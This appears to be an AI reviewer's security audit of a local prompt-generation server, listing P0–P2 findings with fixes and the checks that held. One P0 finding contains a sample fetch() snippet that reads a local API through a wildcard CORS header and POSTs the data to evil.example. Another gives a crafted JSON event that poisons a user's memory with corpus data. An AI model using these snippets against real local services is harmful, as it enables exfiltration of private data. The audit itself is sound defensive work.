# Ox Alpha — Hostile Gate Review

**Reviewer:** OpenRouter `stealth/ox-alpha` (effort: high)
**Served:** `stealth/ox-alpha`
**Document:** docs/ai-workflow/AI-HANDOFF/TASTE-BRAIN-ROUND3-PANEL-PACKET-2026-08-26.md
**Seed:** (none)
**Tokens:** 51732 in / 14193 out · **Cost:** ~$0.0000 · **Wall:** 387.2s · **finish:** stop

---

# Round-3 hostile review — Swan Taste Brain @ `fb052c3`

Reviewer seat: ox-alpha. Scope: the unreviewed half (render loop, Make/Make 4, HTTP Range, own-material law, cross-memory boundary, origin gate, taste maths). Every finding below reproduces against the code as printed; nothing here re-litigates the round-1/round-2 fixed list.

---

### P0 — `access-control-allow-origin: *` on every JSON response turns all read endpoints into a drive-by exfiltration channel for any webpage open in the browser
File: `prompter/serve.mjs`   Where: `json()`, lines 40–50
Failure: Any page at `https://evil.example` (visited in any tab of Sean's browser) runs:
```js
fetch('http://127.0.0.1:7331/api/profile?profile=sean&project=default')
  .then(r => r.text())                       // succeeds: ACAO:* makes the body readable
  .then(t => fetch('https://evil.example/x', { method: 'POST', body: t }));
```
Same for `/api/kept` (Sean's kept prompts — corpus-derived text), `/api/prompt?n=50` (full corpus-grammar output), `/api/stats`, `/api/projects`. No click, no CSRF, no gate — the origin gate guards writes only, and `ACAO: *` converts every read into a cross-origin *readable* response. This directly breaks the repo's stated ground truth: the corpus "must never be … served to anyone but Sean."
Why it matters: The origin-gate threat model (origin.mjs header comment: "Reads stay open; they write nothing") assumed reads were unreadable to hostile pages. With `*` they are not. The licence containment law is violated by one line of attacker JS.
Smallest fix: Delete the two `access-control-*` headers from `json()` and the OPTIONS handler. The page is same-origin (needs no CORS); the ComfyUI consumer is the Python node `swan_prompt_node.py` (server-side fetch enforces no CORS). If a ComfyUI *browser-side* extension ever calls these routes, echo the Origin header only when it is in `trustedOrigins(port)` plus `http://127.0.0.1:8188` — never `*`.

### P0 — Corpus sref codes and style names reach non-Sean prompts: `ownOnly` gates grammar and subjects but not `chooseSref`
File: `prompter/lib/generate.mjs`   Where: `generateOne()`, lines 199–200; `chooseSref()`, lines 137–152
Failure: `createProject({profileId:'partner', projectId:'ocean-trial', themeWords:['ocean']})`, then
`GET /api/prompt?profile=partner&project=ocean-trial&n=3`.
`candidatePool` correctly returns an `ownOnly` pool (no corpus subjects, `grammar='descriptive'`, no corpus artists) — but line 200 calls `chooseSref(corpus, …)` unconditionally. The explore path scores **Midlibrary's own `corpus.sref` entries** (`style_name` + `example_prompt`) against the partner's keywords and returns one; `buildParams` appends `--sref 48291` to her prompt, and the API response carries `styleName` straight from the corpus. The fallback branch (line 143–145) hands out an arbitrary corpus code when everything is judged. The own-material law says a non-Sean memory gets "never the corpus, never a corpus artist" — the packet's remit explicitly lists **srefs**. Measured behaviour: her "ocean" memory is decorated with Sean's licensed catalog IDs matched via Midlibrary's style descriptions.
Why it matters: Second door into the corpus, reachable with two benign GETs — no crafted events, no misconfiguration. Exactly the class of defect the ownSubjects fix was meant to close.
Smallest fix: In `generateOne`, `const sref = pool.ownOnly ? null : chooseSref(corpus, taste, rng, mode);` (a non-Sean memory on the shareable pool has no sref-bearing pictures, so its `taste.loved` is empty anyway — this loses nothing legitimate). Add a test asserting no non-default prompt contains `--sref`.

### P1 — The event writer accepts Midlibrary-provenance candidates into any memory: the bundle/agent door back into the corpus
File: `prompter/lib/events.mjs`   Where: `validateEvent()`, candidate loop lines 88–96
Failure: `POST /api/event` (behind the origin gate, which per design is routinely crossed by agents — "grill-me and every agent POST here") with:
```json
{"schemaVersion":1,"eventType":"grid-selection","source":"partner","profileId":"partner",
 "projectId":"trial","sessionId":"abcd1234","presentedAt":"2026-08-26T00:00:00Z",
 "medium":"web","brandContext":"general","generatorDistribution":"midjourney","channel":"bundle",
 "candidates":[{"id":"ml:img:deadbeef","url":"https://cdn.prod.website-files.com/x.jpg",
                "sref":"48291","provenance":"midlibrary-reference"}],
 "items":[{"id":"ml:img:deadbeef","verdict":"closest","reasonCode":"palette",
           "outcomeClass":"style","reasonLockedBeforeReveal":true}]}
```
Validation passes: `url` is any http(s), `provenance:'midlibrary-reference'` is in the enum, and nothing constrains candidate collection/provenance by namespace. `tally` counts it (witness matches), `evidenceLoved` promotes code 48291, `/api/profile` prints it, and the generator endorses it. The `channel:'bundle'` path rides the identical gap. This is the "second door" the remit asks about — the witness law binds *who* writes, nothing binds *what corpus* the candidates may name.
Why it matters: One crafted (or buggy importer's) event permanently poisons a non-Sean memory with corpus metadata — and events are the asset that "cannot be rewritten later."
Smallest fix: In `validateEvent`, after the namespace checks: `if (profileOf(e) !== DEFAULT_PROFILE) for (const c of e.candidates||[]) need(c.provenance !== 'midlibrary-reference', 'midlibrary candidates may never enter a non-Sean memory');`

### P2 — `applyTo` collapses every seed-like field in the graph to one value
File: `prompter/lib/workflow.mjs`   Where: `detectFields()` lines 92 / `applyTo()` line 139
Failure: A captured Flux/SD3-style graph commonly carries both `KSampler.seed` and `KSamplerAdvanced.noise_seed` as independent literals (Sean tunes them separately). `detectFields` collects both; `applyTo` sets **all** of them to the same substituted seed. The drift guard passes by construction (both paths are in the allowed map), so Make silently renders something Sean's manual run would not.
Why it matters: "Nothing else moved" is the product promise; independent seeds moving in lockstep is a semantic change the self-diff is blind to.
Smallest fix: Substitute only the first seed field (`d.fields.seed.slice(0,1)`), or refuse with "graph has N independent seed fields — re-capture" when `new Set(d.fields.seed.map(f=>f.id)).size > 1`.

### P2 — `comfyPost` follows redirects; a graph can be POSTed off-machine
File: `prompter/lib/routes-make.mjs`   Where: `comfyPost()`, line 20
Failure: `fetch` defaults to `redirect:'follow'`. If whatever listens on the configured loopback endpoint (misconfigured port, a dev server, a compromised ComfyUI plugin) answers `302 Location: https://attacker.example/prompt`, fetch re-issues the POST **with Sean's full graph** to the remote host. `comfyApi()` validates the *initial* URL only.
Why it matters: Breaks the "never posts a graph anywhere but the machine it runs on" invariant; low likelihood, one-word fix.
Smallest fix: `fetch(url, { redirect: 'error', … })` in `comfyPost` (and the status probe).

### P2 — `pair` events are validated, stored, and burn pictures — and are never compiled
File: `prompter/lib/profile.mjs`   Where: `tally()`, line 48
Failure: POST a valid `eventType:'pair'` event. `tally` skips everything that is not `grid-selection`, so the judgement affects zero tallies — but `judgedIds` (writer-side never-show-twice) has already burned those candidate IDs in that memory forever. The pictures can never be re-shown, the opinion is never counted, and only a manual `reversal` frees them.
Why it matters: Silent evidence loss with pool exhaustion as the visible symptom; also dead-schema drift (RESPONSES/OUTCOMES enums enforced for rows nothing reads).
Smallest fix: Either compile pairs in `tally` (map A/B to closest/miss on the respective candidate) or refuse `eventType:'pair'` at the writer until it is implemented.

---

## What I checked and found sound

- **Path traversal in `/renders/…`**: tried `../`, `%2e%2e%2f`, backslashes, absolute paths, `token/../../../sean` — every segment regex (`[a-z]+`, `[a-z0-9-]+`, `[a-f0-9]{12}`, `\d{1,5}`) excludes dot and slash; the filename is taken from `readdirSync`, never from the URL; `path.resolve` + `startsWith(dir + sep)` + `lstat` (symlinks fail `isFile`) closes the link door in both `listRenders` and `renderFile`.
- **Cross-memory render theft**: a render URL for `partner/x` resolves only if the token is in *that* memory's `intents.jsonl`; `tokenFor` hashes `profile/project` into the token, so Sean's tokens cannot appear in her intent file. Closed.
- **Origin gate vs DNS rebinding / form posts**: rebinding preserves the attacker hostname in `Host` → refused by the allowlist; `Origin: null` (sandboxed iframe, cross-origin redirect) is a defined string, not `undefined`, → refused; HTML form POST, fetch, XHR and `sendBeacon` all carry `Origin` in current browsers → refused. The no-Origin exemption is reachable only by non-browser clients. Sound as a write gate (the read side is P0-1 above).
- **Shareable-pool back-fill via quota override** (`/api/probe?webb=9&photo=9` on a partner memory): extras are drawn from `pool.images`, already filtered to `SHAREABLE_COLLECTIONS`; the "rest" stratum excludes quota collections, so for a shareable pool it is empty. No Midlibrary fallback. Closed.
- **Hand-edited `project.json` with `"pool":"full"`**: `poolFor` keys the decision on `profile === DEFAULT_PROFILE`, not the file. Closed.
- **`themes.md` leaking into partner directions**: `themesMd` is read only when `isDefaultNamespace`. Closed.
- **Range handler overflow/malice**: `bytes=` + 25 digits → not a safe integer → invalid → legal 200; `start >= size` → 416 with real size; suffix longer than file → whole file; `end` clamped; multipart → 200. No offset arithmetic can exceed the file.
- **Sniff/cap ordering and content-type confusion**: cap checked before open; sniff before any byte is served; mismatch → 415; `nosniff` on every media response; a polyglot named `.mp4` with an `ftyp` head is served as `video/mp4` and cannot execute.
- **Arg injection in `/api/rate` → CLI**: `execFileSync` with an argv array, no shell; `code` regex-anchored, `note` sliced to 200. Closed.
- **Tests writing the production template**: `currentTemplatePath()` resolves `SWAN_COMFY_WORKFLOW` at call time; production path only touched when the env var is absent. Law holds.
- **Own-material artist leak**: `pool.ownOnly` forces `grammar='descriptive'`, so `corpus.artists` is unreachable; `by_artist` can only arise from an artist named in *her own* kept text. Closed (subjects/artists — srefs are P0-2).
- **Video parameter law**: `subjectOf` splits at the first `\s--`, so no MJ parameter survives into a video prompt, including from kept prompts. Holds.
- **Append races**: `appendEvent` is fully synchronous end-to-end; two concurrent POSTs cannot interleave inside the read-dedupe-append window.
- **Render-judgement style leak**: in `tally`, the `if (generated) continue` sits after the subject bump and before reasons/srefs/provenance — verified for verdicts `closest`, `miss`, and `outcomeClass:'mixed'`; a render reaches style tallies by no input I could construct (short of forging `provenance`, which is P1-3's door).
- **Reversal maths**: `activeEvents` drops reversed grids before both `tally` and `judgedIds`; double-reversal is idempotent; `reversalOf` must name a non-reversal event in the same directory.

---

## Verdict

**REVISE**

Two P0s block ship: the `ACAO: *` read-exfiltration channel (one-line deletion, breaks the licence containment ground truth) and corpus sref codes flowing into non-Sean prompts through `chooseSref` (the own-material law's unfinished half). P1-3 should land in the same pass — it is the same law at the event writer, and events are the unrevisable asset. The P2s can ride the next commit. The render loop's path composition, the Range subset, and the namespace binding are genuinely tight; the gap is the assumption that "reads write nothing" implies "reads expose nothing."
